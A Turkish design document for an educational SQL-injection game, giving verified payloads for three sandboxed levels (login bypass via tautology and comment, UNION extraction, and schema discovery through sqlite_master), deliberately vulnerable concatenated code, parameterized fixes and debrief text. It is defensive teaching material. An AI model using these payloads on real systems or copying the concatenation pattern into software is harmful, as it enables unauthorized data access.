# 03 — Güvenlik İçeriği (SQL Heist)

> Gate 2 çıktısı (security-analyst). `00-vision.md` + `01-architecture.md` (KANONİK: şema/engine/DSL)
> + `02-game-design.md` (KANONİK: skor/ipucu/loot-semantiği) + `locked-contract.md`'e dayanır.
> **Şema adları/flag'ler `05-data-model` (data-modeler) ile SENKRONLANDI** (plan-reviewer düzeltmesi).
> Statü: **TASLAK — parent/kullanıcı onayı bekliyor.** · Sürüm: v0.3
>
> **SAHİPLİK:** Yalnızca **payload + secure-fix DOĞRULUĞU**nun sahibidir (01 §0). RAKİP şema/DSL/skor
> üretmez; engine kontratını (§3) + kilitli 3-job skeleton'ını (kolon sayıları DONMUŞ) + 05 kanonik
> tablo/kolon/flag adlarını TÜKETİR.
>
> **DOĞRULUK GARANTİSİ (kritik):** Her payload ve her secure-fix, **05'in gerçek şemasına** karşı —
> engine'in ham `{{input}}` yerleştirmesi birebir taklit edilerek — gerçek SQLite (3.53.2, Python
> `sqlite3`) üzerinde **çalıştırılarak** doğrulandı (kanıt §8; v0.3'te 05'in GERÇEK seed'ine karşı — satır sayıları dahil — taze koşuldu).
> sql.js aynı motordur; `--`, `sqlite_master`, `UNION`, `ORDER BY n`, `LIKE`, tautology tüm sürümlerde
> stabildir → sürüm farkı payload'ları etkilemez. Yanlış/çalışmayan payload = kritik hata; hepsi L2/L3 kanıtlı.

---

## 0. Kapsam, sahiplik, doğrulama yöntemi

**Ürettiği (downstream tüketir):** Her job için (a) çalışan payload, (b) zafiyet kök-nedeni,
(c) parametreli güvenli karşılık, (d) "neden çalıştı → neden fix kapatır" eşleşmesi. Kanonik şema
alanlarına (01 §4) oturur:

| İçerik | Şema alanı (01 §4) |
|--------|--------------------|
| Saldırı neden çalıştı | `debrief.explanation` |
| Zafiyetli desen | `debrief.vulnerableCode` (`CodeSnippet`) |
| Güvenli desen | `debrief.secureCode` (`CodeSnippet`) |
| Tek cümle ders | `debrief.takeaway` |
| Bilinen-iyi payload | `expectedSolution.inputs` (won===true; 01 §8.4, R2) |
| Tier-2/3 ipucu | `hints[]` (02 §7.2) |

**Doğrulama yöntemi:** `QueryComposer.compose` (01 §3.1: `{{input:field}}` → HAM değer, escape YOK)
taklit edildi; oluşan SQL 05 seed'li in-memory SQLite'a koştu; win-condition (01 §5.2 DSL)
değerlendirildi; anti-trivial (benign → won===false) her job'da koşuldu. Kanıt: §8.

---

## 1. Etik + güvenli sandbox çerçevesi

Savunma öğreten bir güvenlik oyunu; saldırgan zihniyeti savunmacı amaçla.

1. **Gerçek hedef YOK.** Payload'lar yalnız bizim geçici, in-memory SQLite DB'mize karşı (vision §9,
   architect §2.4). Ağ/disk/uzak sistem yok.
2. **Ephemeral + reset.** Her `Run` taze DB; yıkıcı payload bile yalnız atılabilir DB'yi etkiler (architect §2.2).
3. **Saldırı → savunma zorunlu.** Hiçbir job savunma debrief'i olmadan kapanmaz (vision §1, §10).
4. **SQLite-only, sorumlu.** Payload'lar SQLite sözdizimi; operasyonel gerçek-hedef talimatı yok.
5. **Kopyalanabilir savunma.** `secureCode` gerçek dünyada uygulanabilir parametreli desenler.

---

## 2. SQLite-özgü doğruluk notları (job'lar arası — payload temeli)

Hepsi §8'de çalıştırılarak doğrulandı.

**2.1 Yorum sözdizimi.** `--` (satır/girdi sonuna kadar) SQLite'ta çalışır; sondaki boşluk zorunlu
değil ama **kanonik biçim `-- ` (boşluklu)**. `/* ... */` blok yorum da çalışır. **`#` SQLite'ta
ÇALIŞMAZ** (`unrecognized token: "#"`) — MySQL'e özgü; **öğretilmez** (K8). Yalnız `--` öğretilir.

**2.2 LIKE-sarmalı enjeksiyon (Vault + Blueprint).** Template `... LIKE '%{{input:q}}%'`. Oyuncu `'`
ile başlayınca `'%` + `'` → `'%'` (literal kapanır) → canlı SQL → `-- ` sondaki `%'`'ı yorumlar.
Oluşan SQL `... LIKE '%' UNION SELECT ... -- %'` geçerlidir (§8).

**2.3 Kolon sayısı keşfi + gerçek hata mesajları.**
- `ORDER BY n`: aşınca (Vault, 3 kolon) → `1st ORDER BY term out of range - should be between 1 and 3`.
- `UNION SELECT NULL,...`: sayı tutmazsa → `SELECTs to the left and right of UNION do not have the same number of result columns`.
Bu mesajlar debrief/feedback'te birebir gösterilebilir (game-design §10.2).

**2.4 Dinamik tipleme → UNION tip hizası serbest.** SQLite UNION'da tip zorlamaz; TEXT değeri INTEGER
kolon-pozisyonuna UNION'lamak sorunsuz (§8: `holder_name` metni `id` pozisyonuna geldi, hata yok).
Yalnız **KOLON SAYISI** kritik; tip derdi yok.

**2.5 Katalog tablosu.** `sqlite_master` kanoniktir (her sürümde var; modern alias `sqlite_schema`).
Uyum için payload'da `sqlite_master` kullanılır. Kolonları: `type, name, tbl_name, rootpage, sql`;
`sql` alanı her tablonun `CREATE`'ini → kolonlarını verir. `WHERE type='table'` filtresi opsiyoneldir
(gürültüyü azaltır); filtresiz de gizli tabloyu listeler (§8).

---

## 3. Job 1 — The Front Door (Auth bypass · tautology + comment · T1–2)

**Kilitli (locked-contract §D + 05):** yüzey = login formu; `users(id, username, password, is_admin)`
(kolonlar TAM bunlar). Win = `row-match { expect:[{ is_admin:1 }], mode:"subset" }` (NİHAİ biçim:
dizi + subset). Zafiyetli template **`is_admin`'i projekte eder**:
```sql
SELECT id, username, is_admin FROM users
WHERE username = '{{input:username}}' AND password = '{{input:password}}'
```

### 3.1 Saldırı — teknik + ÇALIŞAN payload (doğrulandı §8)

İki kazanan yol (game-design §4.1):

**Yol A — hedefli comment bypass:** `username` = `admin' -- ` , `password` = herhangi. Oluşan SQL:
```sql
SELECT id, username, is_admin FROM users WHERE username = 'admin' -- ' AND password = 'x'
```
`'admin'` kapanır; `-- ` password kontrolünü yoruma alır → admin satırı döner (`is_admin=1`).
**Doğrulandı: 1 satır, is_admin=1, WIN.** (Ön koşul: `admin` kullanıcı adı biliniyor — recon/brief.)

**Yol B — tautology (kullanıcı adı bilmeden):** `username` = `' OR '1'='1' -- ` , `password` = herhangi.
Oluşan SQL:
```sql
SELECT id, username, is_admin FROM users WHERE username = '' OR '1'='1' -- ' AND password = 'x'
```
`OR '1'='1'` daima DOĞRU → tüm tablo; `-- ` password'u siler. **Doğrulandı: 4 satır (admin dahil),
subset[{is_admin:1}] → is_admin=1 satırı mevcut → WIN.**

> `expectedSolution.inputs`: `{ "username": "' OR '1'='1' -- ", "password": "x" }` (Yol B; Yol A da geçer).
> Anti-trivial doğrulandı: `{j.marlow, wrong}` ve `{admin, ""}` → **0 satır → won=false.**

### 3.2 Zafiyetli desen — neden enjekte edilebilir

İnput SQL metnine **string konkatlanır** (engine `{{input}}` ham = gerçek dünya concat). Kapatıcı `'`
girince input **veri değil KOD** olur: tırnak literal'i erken bitirir, `--` gerisini siler.

`debrief.vulnerableCode`:
```js
// VULNERABLE — input doğrudan SQL string'ine konkatlanıyor (oyundaki {{input}} = bu)
const sql =
  "SELECT id, username, is_admin FROM users " +
  "WHERE username = '" + username + "' AND password = '" + password + "'";
const row = db.prepare(sql).get();      // kod + veri aynı string → enjeksiyon
```

### 3.3 Savunma — parametreli/prepared + neden kapatır

`debrief.secureCode` (§8'de payload'a karşı çalıştırılarak doğrulandı):
```js
// SECURE — değerler PARAMETRE olarak bind edilir; asla SQL olarak ayrıştırılmaz
const row = db
  .prepare("SELECT id, username, is_admin FROM users WHERE username = ? AND password = ?")
  .get(username, password);
// Derinlemesine savunma: parolayı düz metin tutma — hash sakla (bcrypt/argon2), sabit-zamanlı karşılaştır.
```
**Neden kapatır (kanıtlı):** Bind edilen değer sürücüye **kod değil düz literal** gider; `?` tek bir
string sabitidir. Aynı `' OR '1'='1' -- ` parametreli sorguya verilince motor onu "böyle bir kullanıcı
adı" sanar → **0 satır** (§8: `FrontDoor param + tautology -> rows: []`). Tırnak ve `--` artık yalnız
aranan metnin karakterleridir.

### 3.4 Debrief eşleşmesi — "neden çalıştı → neden fix kapatır" (ZORUNLU, game-design §9)

| Beat | İçerik (oyuncunun KENDİ payload'ına demirli) |
|------|----------------------------------------------|
| Ne yaptın | `' OR '1'='1' -- ` yazdın; tırnak string'i kapattı, `OR '1'='1'` koşulu daima doğru yaptı, `--` password kontrolünü sildi. |
| Neden çalıştı | Input SQL'e **konkatlandığı** için veri→kod sınırı yoktu; tırnağın sorgu mantığını yeniden yazdı. |
| Fix | `username = ?` + değeri **bind et** (secureCode). |
| Neden kapatır | Parametrede `' OR '1'='1'` zararsız bir kullanıcı-adı string'ine döner; böyle kullanıcı yok → giriş reddedilir. Kod ve veri ayrı düzlemde. |
| Takeaway | **"Input'u SQL'e konkatlamayı bırak — bind et."** |

### 3.5 İpucu payload'ları (02 §7.2)
- **Tier 2:** "İki fikir: koşulu hep-doğru yap (`OR` + daima doğru bir eşitlik) ya da satırı `--` ile
  kısa kes. Tırnak, string'i erken bitirebilir."
- **Tier 3 (çalışır):** username'e `admin' -- ` **veya** `' OR '1'='1' -- ` yaz; `-- ` password kontrolünü yoruma alır.

---

## 4. Job 2 — The Vault (Kolon sayısı + UNION extraction · **3 KOLON** · T3–4)

**Kilitli (locked-contract §D + 05):** yüzey = arama kutusu; **UNION = 3 KOLON** (DONMUŞ); görünür
`products(id, name, price)`; **bilinen** loot tablosu `offshore_accounts(id, holder_name, account_ref,
balance_usd)`; loot = `account_ref` = `LOOT-VAULT-9F2C4471`; win = `flag-in-result { flag:"LOOT-VAULT-9F2C4471" }`.

**Kanonik zafiyetli template** (3 görünür kolon):
```sql
SELECT id, name, price FROM products WHERE name LIKE '%{{input:q}}%'
```

### 4.1 Saldırı — teknik + ÇALIŞAN payload (doğrulandı §8)

**Adım A — kolon sayısını bul (recon):**
- `' ORDER BY 3 -- ` → OK; `' ORDER BY 4 -- ` → hata `1st ORDER BY term out of range - should be between 1 and 3` → kolon = 3.
- Alternatif: `' UNION SELECT NULL,NULL,NULL -- ` → OK; `' UNION SELECT NULL,NULL -- ` → hata `SELECTs ... same number of result columns`.

**Adım B — UNION ile çapraz-tablo extraction (loot):**
`q` = `' UNION SELECT holder_name, account_ref, balance_usd FROM offshore_accounts -- ` . Oluşan SQL:
```sql
SELECT id, name, price FROM products WHERE name LIKE '%'
UNION SELECT holder_name, account_ref, balance_usd FROM offshore_accounts -- %'
```
`'%'` tüm ürünler; UNION `offshore_accounts`'ın 3 kolonunu sonuç ızgarasına taşır (kolon sayısı = 3
eşleşir; `offshore_accounts` 4 kolonlu ama anlamlı 3'ü seçilir, `id` atlanır). **Doğrulandı:
`LOOT-VAULT-9F2C4471` ızgarada belirdi → WIN.**
- **Temiz varyant (yalnız loot):** `zzz' UNION SELECT holder_name, account_ref, balance_usd FROM offshore_accounts -- ` → yalnız offshore satırları (§8: 4 satır). `UNION ALL` da çalışır.

> `expectedSolution.inputs`: `{ "q": "' UNION SELECT holder_name, account_ref, balance_usd FROM offshore_accounts -- " }`
> (kazanan = extraction; Adım A non-terminal milestone). Anti-trivial: benign `Drill` → yalnız products, flag yok → won=false.

> **KİLİT UYUM:** UNION 3 kolon ↔ template 3 kolon ↔ `offshore_accounts`. Tablo BİLİNİR (brief/recon
> intel: ad + kolonlar); kolon SAYISI (3) DONMUŞ. flag `account_ref` değerine bağlı (§8 doğruladı).

### 4.2 Zafiyetli desen — neden enjekte edilebilir
`LIKE '%...%'` içine input konkatlanıyor; `'` arama string'ini kapatıp `UNION SELECT`'i ekliyor.
`UNION`, saldırganın **kendi** ikinci SELECT'ini (başka tablo) aynı sonuca bitiştirmesine izin verir
— tek koşul kolon sayısı eşit.

`debrief.vulnerableCode`:
```js
// VULNERABLE — arama terimi LIKE desenine konkatlanıyor
const sql = "SELECT id, name, price FROM products WHERE name LIKE '%" + q + "%'";
const rows = db.prepare(sql).all();
```

### 4.3 Savunma — parametreli LIKE + neden kapatır
`debrief.secureCode` (§8'de payload'a karşı çalıştırılarak doğrulandı):
```js
// SECURE — % joker karakterleri KOD'da eklenir; q bir LİTERAL değer olarak bind edilir
const rows = db
  .prepare("SELECT id, name, price FROM products WHERE name LIKE ?")
  .all('%' + q + '%');
```
**Neden kapatır (kanıtlı):** Bind edilen `q` tek bir arama string'i olur; `' UNION SELECT ... ` artık
operatör değil aranan metindir → `offshore_accounts` sızmaz. §8: parametreli LIKE + UNION → **`[]`**;
benign `Drill` → hâlâ 1 ürün (işlev korunur).

### 4.4 Debrief eşleşmesi (ZORUNLU)

| Beat | İçerik |
|------|--------|
| Ne yaptın | `ORDER BY`/`UNION SELECT NULL` ile 3 kolon buldun; sonra `' UNION SELECT holder_name, account_ref, balance_usd FROM offshore_accounts -- ` ile başka tablodan çektin. |
| Neden çalıştı | Arama input'u LIKE'a konkatlandığı için tırnakla string'i kapatıp `UNION` ekledin; kolon sayısı tutunca SQLite iki tabloyu tek sonuçta birleştirdi. |
| Fix | `LIKE ?` + deseni bind et (secureCode). |
| Neden kapatır | Bind edilen `q` kod değil düz metin; `UNION`'ın tamamı "aranacak isim" sayılır → çapraz-tablo okuma imkânsız. |
| Takeaway | **"Aramada bile input veri'dir — bind et, konkatlama."** |

### 4.5 İpucu payload'ları
- **Tier 2:** "Önce kaç kolon dönüyor bul: `ORDER BY 1`, `2`, `3`... kırılana kadar; çalışan son sayı kolon sayın. Sonra o kadar değerle `UNION SELECT` — ikinci sorgu **aynı kolon sayısına** uymalı."
- **Tier 3 (çalışır):** 3 kolon. `' UNION SELECT holder_name, account_ref, balance_usd FROM offshore_accounts -- ` (tablo brief/recon'da verildi).

---

## 5. Job 3 — The Blueprint (Şema keşfi `sqlite_master` → UNION · **2 KOLON** · T5)

**Kilitli (locked-contract §D + 05):** yüzey = arama / URL param; **UNION = 2 KOLON** (DONMUŞ, Vault'tan
farklı); görünür `articles(title, body)`; **gizli** loot tablosu `z_bp_registry_7f3a(schematic_id,
payload)` — **`visibleSchema`'da YOK** (keşif zorunlu); loot = `payload` = `LOOT-BLUEPRINT-3D1F8A22`;
win = `flag-in-result { flag:"LOOT-BLUEPRINT-3D1F8A22" }`.

**Kanonik zafiyetli template** (2 görünür kolon):
```sql
SELECT title, body FROM articles WHERE title LIKE '%{{input:q}}%'
```

### 5.1 Saldırı — teknik + ÇALIŞAN payload (doğrulandı §8)

**Adım A — şema keşfi (`sqlite_master`):**
`q` = `' UNION SELECT name, sql FROM sqlite_master -- ` . Oluşan SQL:
```sql
SELECT title, body FROM articles WHERE title LIKE '%'
UNION SELECT name, sql FROM sqlite_master -- %'
```
Katalogdan tablo adlarını (`name`) + `CREATE` ifadelerini (`sql`) döker (2 kolon: `name, sql`).
**Doğrulandı:** gizli `z_bp_registry_7f3a` ve `CREATE TABLE z_bp_registry_7f3a (id INTEGER PRIMARY KEY, schematic_id TEXT,
payload TEXT)` göründü → oyuncu tablo adını + kolonlarını öğrenir. (Gürültüyü azaltmak için opsiyonel
`... WHERE type='table' -- `; §8 ikisini de doğruladı.)

**Adım B — keşfedilen tablodan extraction:**
`q` = `' UNION SELECT schematic_id, payload FROM z_bp_registry_7f3a -- ` . Oluşan SQL:
```sql
SELECT title, body FROM articles WHERE title LIKE '%'
UNION SELECT schematic_id, payload FROM z_bp_registry_7f3a -- %'
```
**Doğrulandı:** `LOOT-BLUEPRINT-3D1F8A22` ızgarada belirdi → WIN. Temiz varyant: `zzz' UNION SELECT
schematic_id, payload FROM z_bp_registry_7f3a -- ` → yalnız `z_bp_registry_7f3a` satırları (§8: 2 satır).

> `expectedSolution.inputs`: `{ "q": "' UNION SELECT schematic_id, payload FROM z_bp_registry_7f3a -- " }`
> (kazanan = final extraction; Adım A non-terminal milestone — "şema açığa çıktı" sinyali, game-design §10.2).
> Anti-trivial: benign `Security` → yalnız articles → won=false. Adım A tek başına win DEĞİLDİR (flag hâlâ
> görünmez) → keşif + extraction zinciri zorunlu (game-design §4.3).

> **KİLİT UYUM:** UNION 2 kolon ↔ template 2 kolon ↔ `z_bp_registry_7f3a`'nın 2 kolonu. Tablo adı
> tahmin-edilemez VE `visibleSchema`'da LİSTELENMEZ (yoksa `sqlite_master` keşfi atlanır — ders kaybolur;
> game-design §13). flag `payload` değerine bağlı (§8 doğruladı).

### 5.2 Zafiyetli desen — neden enjekte edilebilir
Vault ile aynı kök (LIKE'a konkatenasyon). Ek ders: tablo adını bilmesen bile **veritabanının kendi
metadata'sı** (`sqlite_master`) UNION ile okunur → gizli şema açığa çıkar. Zafiyet aynı, etki daha derin.

`debrief.vulnerableCode`:
```js
// VULNERABLE — Vault ile aynı desen; katalog (sqlite_master) da bu yüzden okunabilir
const sql = "SELECT title, body FROM articles WHERE title LIKE '%" + q + "%'";
const rows = db.prepare(sql).all();
```

### 5.3 Savunma — parametreli LIKE + derinlemesine savunma
`debrief.secureCode`:
```js
// SECURE — desen bind edilir; UNION/sqlite_master artık "aranacak metin"
const rows = db
  .prepare("SELECT title, body FROM articles WHERE title LIKE ?")
  .all('%' + q + '%');
// Derinlemesine savunma: en az yetki — uygulama hesabı yalnız gereken tablolara erişsin;
// gerçek RDBMS'lerde katalog/diğer tabloları arama yoluna açma.
```
**Neden kapatır (kanıtlı):** Bind edilince `' UNION SELECT name, sql FROM sqlite_master -- ` literal arama
string'i olur → katalog sorgusu **hiç çalışmaz**; şema keşfi de extraction da imkânsız (§8: parametreli
LIKE her UNION'ı `[]`'e indirir). En-az-yetki, parametrizasyon delinse bile hasarı sınırlayan ikinci kat.

### 5.4 Debrief eşleşmesi (ZORUNLU)

| Beat | İçerik |
|------|--------|
| Ne yaptın | Tablo adını bilmiyordun; `' UNION SELECT name, sql FROM sqlite_master -- ` ile şemayı çıkardın, `z_bp_registry_7f3a`'yı buldun, sonra ona UNION atıp flag'i çektin. |
| Neden çalıştı | Aynı konkatenasyon açığı; üstelik `sqlite_master` her SQLite DB'sinde şemayı standart açığa çıkarır → tahmine gerek kalmadı. |
| Fix | `LIKE ?` + bind (secureCode) + en-az-yetki. |
| Neden kapatır | Bind edilince katalog sorgun düz metne döner, çalışmaz; şema haritalanamaz. En-az-yetki erişimi daraltır. |
| Takeaway | **"Konkatlama açığı tüm şemayı verir. Bind et; erişimi daralt."** |

### 5.5 İpucu payload'ları
- **Tier 2:** "Tablo adını tahmin etme — veritabanı kendi kataloğunu tutar: SQLite'ta `sqlite_master`. `name` ve `sql`'i çek; `sql` alanı kolonları gösterir. (Bu job **2 kolon**.)"
- **Tier 3 (çalışır):** Önce `' UNION SELECT name, sql FROM sqlite_master -- ` (tabloyu + kolonları keşfet); sonra `' UNION SELECT schematic_id, payload FROM z_bp_registry_7f3a -- `.

---

## 6. Riskli noktalar / koordinasyon kısıtları (KRİTİK)

- **K1 — Front Door projeksiyonu — [ÇÖZÜLDÜ v0.2]:** 05 kanonik `users(id, username, password, is_admin)`
  Template `is_admin`'i projekte eder (kolonlar tam) → win `row-match{expect:[{is_admin:1}],subset}` değerlendirilir. §8 doğruladı.
- **K2 — Vault = 3 kolon (DONMUŞ):** template 3 (`id, name, price`) ↔ UNION 3 ↔ `offshore_accounts` (4 kolonundan 3'ü seçilir).
- **K3 — Blueprint = 2 kolon (DONMUŞ):** template 2 (`title, body`) ↔ UNION 2 ↔ `z_bp_registry_7f3a(schematic_id, payload)`; tablo `visibleSchema`'da GİZLİ.
- **K4 — flag tek-kaynak + loot-only — [05 ile SENKRON]:** Vault flag `LOOT-VAULT-9F2C4471` = `offshore_accounts.account_ref`; Blueprint flag `LOOT-BLUEPRINT-3D1F8A22` = `z_bp_registry_7f3a.payload`. `winCondition.flag` bu değerlere **byte-byte** eşit; yalnız loot tablosunda seed'li (false-positive önlemi, game-design §13).
- **K5 — expectedSolution gerçek adlarla — [ÇÖZÜLDÜ v0.2]:** tüm payload'lar 05 kanonik tablo/kolon adlarını (`offshore_accounts`, `holder_name`, `account_ref`, `balance_usd`, `z_bp_registry_7f3a`, `schematic_id`, `payload`) kullanır; placeholder kalmadı.
- **K6 — win DSL biçimi — [ÇÖZÜLDÜ v0.2]:** NİHAİ biçim architect §5.2 formu: `row-match { expect: Array<Record>, mode: 'subset'|'exact' }`. Front Door = `expect:[{is_admin:1}], mode:"subset"`. WinEvaluator `subset` = "her beklenen satır sonuçta mevcut" uygular (locked §C'nin "any"/tek-nesne taslağı geçersiz). Payload doğruluğunu etkilemez.
- **K7 — XSS (architect R1):** payload + sonuç hücreleri (flag dahil) echo edilir → tüm echo React text-escape; `dangerouslySetInnerHTML` YASAK. Kanonik flag'ler (`LOOT-...`) HTML-magic karakter içermez (ikinci kat), ama escape yine zorunlu.
- **K8 — `#` öğretilmez:** SQLite'ta `#` çalışmaz (`unrecognized token`); ipucu/debrief yalnız `--` (ve gerekirse `/* */`) öğretir.
- **K9 — Anti-trivial (her job):** benign/boş input → won=false (§8'de üçü de doğrulandı). Front Door: admin parolası boş/tahminsiz olmalı (05), benign 0 satır.

---

## 7. Güvenlik ONAY kriteri (vision §10)

1. **[✓ §8] Her job payload'ı 05 şemasına karşı gerçek SQLite'ta çalışır** — 3 job tüm adımlar koştu.
2. **[✓ §8] Anti-trivial:** her job benign → won=false.
3. **[✓ §8] Kolon sayıları:** Vault=3, Blueprint=2 — ORDER BY/UNION hataları kanıt.
4. **[✓ §8] Secure-fix kapatır:** parametreli sürüm payload'ı `[]`'e indirir, benign işlevi korur.
5. **[✓ §3–5] Attack↔defense eşleşmesi eksiksiz** (5 beat × 3 job).
6. **[✓ v0.2] flag tek-kaynak (K4)** 05 kanonik değerlerle; byte-eşleşme test-harness'ta teyit edilir.
7. **[implementasyon] XSS (K7)** — engine çıktısında `dangerouslySetInnerHTML` yok; echo text-escape.
8. **[implementasyon] test-harness (R2):** her level `expectedSolution.inputs`→won=true, benign→won=false.
9. **[✓ §1] Etik/sandbox çerçevesi.**

Kırmızı çizgi: yanlış/çalışmayan payload = onay YOK. Şu an 1–6 + 9 SAĞLANDI; 7–8 engine implementasyonunda kapanır.

---

## 8. Doğrulama kanıtı (verification log — SQLite 3.53.2, 05'in GERÇEK schema+seed'ine karşı, v0.3'te satır sayıları dahil taze koşuldu)

Her satır gerçekten çalıştırıldı (ham `{{input}}` compose → SQLite exec → win eval).

| Job | Girdi | Sonuç | Win |
|-----|-------|-------|-----|
| Front Door | benign `j.marlow`/`wrong` | 0 satır | **false** (anti-trivial ✓) |
| Front Door | benign `admin`/`''` | 0 satır | **false** (anti-trivial ✓) |
| Front Door | `admin' -- ` | 1 satır (is_admin=1) | **true** |
| Front Door | `' OR '1'='1' -- ` | 4 satır (admin dahil) | **true** (subset[is_admin:1]) |
| Vault | benign `Drill` | 1 ürün, flag yok | **false** (anti-trivial ✓) |
| Vault | `' ORDER BY 3 -- ` | OK (4 satır) | (kolon=3 ✓) |
| Vault | `' ORDER BY 4 -- ` | ERROR `...out of range...between 1 and 3` | (kolon sınırı ✓) |
| Vault | `' UNION SELECT NULL,NULL,NULL -- ` | OK (5 satır) | (kolon=3 doğrulama ✓) |
| Vault | `' UNION SELECT NULL,NULL -- ` | ERROR `...same number of result columns` | (mismatch ✓) |
| Vault | `' UNION SELECT holder_name, account_ref, balance_usd FROM offshore_accounts -- ` | 8 satır, `LOOT-VAULT-9F2C4471` ızgarada | **true** |
| Vault | `zzz' UNION SELECT holder_name, account_ref, balance_usd FROM offshore_accounts -- ` (temiz) | 4 satır (yalnız offshore) | **true** |
| Blueprint | benign `Security` | 1 makale | **false** (anti-trivial ✓) |
| Blueprint | `' UNION SELECT name, sql FROM sqlite_master -- ` | 5 satır (3 makale + 2 tablo); `z_bp_registry_7f3a` + CREATE göründü | (keşif ✓, non-terminal) |
| Blueprint | `' UNION SELECT name, sql FROM sqlite_master WHERE type='table' -- ` | 5 satır; aynı tablo listesi | (filtre opsiyonel ✓) |
| Blueprint | `' UNION SELECT schematic_id, payload FROM z_bp_registry_7f3a -- ` | 5 satır, `LOOT-BLUEPRINT-3D1F8A22` ızgarada | **true** |
| Blueprint | `zzz' UNION SELECT schematic_id, payload FROM z_bp_registry_7f3a -- ` (temiz) | 2 satır (yalnız loot) | **true** |
| SECURE (Front Door) | parametreli + `' OR '1'='1' -- ` | **0 satır** | saldırı nötr ✓ |
| SECURE (Vault/BP) | parametreli LIKE + UNION payload | **0 satır**; benign `Drill`→1 ürün | saldırı nötr, işlev korunur ✓ |
| Edge | `#` yorumu | ERROR `unrecognized token: "#"` | SQLite `#` desteklemez (K8) ✓ |
| Edge | `--` / `/* */` | OK | SQLite yorumları ✓ |

**Sonuç: TÜM job payload'ları + secure-fix'ler + anti-trivial PASS (05 kanonik şemasına karşı).**

---

## 9. Downstream devir
- **data-modeler (05):** payload'lar 05 kanonik adlarına göre yazıldı; K4 (flag = `account_ref`/`payload`, loot-only), K9 (Front Door benign 0-satır seed) teyit noktaları.
- **backend-dev / kraken:** kanonik template'ler (§3/§4/§5), K6 (row-match `subset` semantiği), K7 (XSS text-escape).
- **tdd-guide / mocksmith:** `expectedSolution.inputs` (§3.1/§4.1/§5.1) + §8 benign girdileri (solvability & R2).
- **copywriter (06):** debrief beat metinleri (§x.4) + tier-1 nudge (tier-2/3 doğruluğu bende).
- **security-reviewer:** §7 kriteri 7–8'i engine ile kapatır.

## Değişiklik günlüğü
| Sürüm | Tarih | Değişiklik |
|-------|-------|-----------|
| v0.1 | 2026-07-29 | İlk taslak; SQLite'a karşı doğrulanmış payload + secure-fix + debrief eşleşmesi. |
| v0.2 | 2026-07-29 | **plan-reviewer senkron düzeltmesi:** payload/template/flag adları 05 kanonik şemasıyla senkronlandı. Front Door template `is_admin`'i projekte eder, win NİHAİ biçime (`expect:[{is_admin:1}], subset`) geçti (K1/K6 ÇÖZÜLDÜ). Vault loot tablosu `offshore_accounts(holder_name, account_ref, balance_usd)`, flag `LOOT-VAULT-9F2C4471`. Blueprint gizli tablo `z_bp_registry_7f3a(schematic_id, payload)`, flag `LOOT-BLUEPRINT-3D1F8A22`; discovery `WHERE type='table'` opsiyonele indi. v0.1 placeholder tablo/kolon/flag adları tamamen çıkarıldı. §8 log 05 adlarıyla YENİDEN çalıştırıldı — tümü PASS. |
| v0.3 | 2026-07-29 | **plan-reviewer sayım düzeltmesi:** §8 doğrulama log'u 05'in GERÇEK schema+seed'ine karşı (engine ham `{{input}}` compose taklidiyle) SQLite'ta taze koşuldu; bayat satır sayıları gerçek değerlerle düzeltildi (Front Door tautology 4; Vault ORDER BY→4, UNION NULL→5, extraction→8, temiz→4; Blueprint keşif→5, extraction→5, temiz→2). Doğrulama-dışı benign arama terimleri 05 seed'iyle eşleşen değerlerle güncellendi; §5.1 keşif CREATE illüstrasyonu 05 DDL'ine hizalandı. WIN/flag/secure-fix(`[]`)/anti-trivial sonuçları değişmedi — tümü PASS. |
